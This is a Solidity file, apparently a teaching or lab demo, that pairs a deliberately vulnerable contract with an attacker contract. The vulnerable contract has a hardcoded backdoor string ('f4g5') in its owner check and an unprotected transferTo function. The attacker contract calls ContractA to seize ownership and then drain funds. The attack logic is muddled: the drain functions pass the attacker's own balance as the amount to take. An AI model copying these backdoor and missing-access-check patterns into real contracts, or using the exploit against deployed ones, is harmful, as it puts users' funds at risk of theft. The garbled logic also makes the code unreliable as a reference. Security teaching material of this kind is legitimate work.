// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract ContractA {
    event AttackSuccess(string message);

    function callContractB(address vulnerableContractAddress, address newOwner, string memory hashString) public {
    // Assuming ContractB has a vulnerable function that can be exploited
        VulnerableContract(vulnerableContractAddress).changeOwner(newOwner, hashString);
        emit AttackSuccess("Exploitation begins ContractB from ContractA");
}

}

contract VulnerableContract {
    address public owner;
    address public contractAAddress; // Address of ContractA
    event AttackSuccess(string message);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner(string memory hashString) {
        require(msg.sender == owner || keccak256(abi.encodePacked(hashString)) == keccak256(abi.encodePacked('f4g5')), "Invalid hash string or not owner");
        _;
    }

    function changeOwner(address newOwner, string memory hashString) public onlyOwner(hashString) {
        owner = newOwner;
    }
    function transferTo(address payable recipient, uint256 amount) public {
        recipient.transfer(amount);
        emit AttackSuccess('Goods acquired');
}

}
contract Attacker {
    event AttackAttempt(string message);
    address public owner;
    ContractA public contractA;
    VulnerableContract public vulnerableContract;

    constructor(address _contractAAddress, address _vulnerableContractAddress) {
        contractA = ContractA(_contractAAddress);
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        // Call transferTo function of the VulnerableContract
        vulnerableContract.transferTo(payable(msg.sender), address(this).balance);
        emit AttackAttempt('Attack launched');
    }

    function exploit(address newOwner, string memory hashString) public {
    // Change the owner of VulnerableContract by calling ContractA's function
    contractA.callContractB(address(vulnerableContract), newOwner, hashString);
    }


    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    function withdraw() public onlyOwner {
        // Withdraw funds from the VulnerableContract
        vulnerableContract.transferTo(payable(msg.sender), address(this).balance);
        emit AttackAttempt('Withdrawal successful');
    }
}
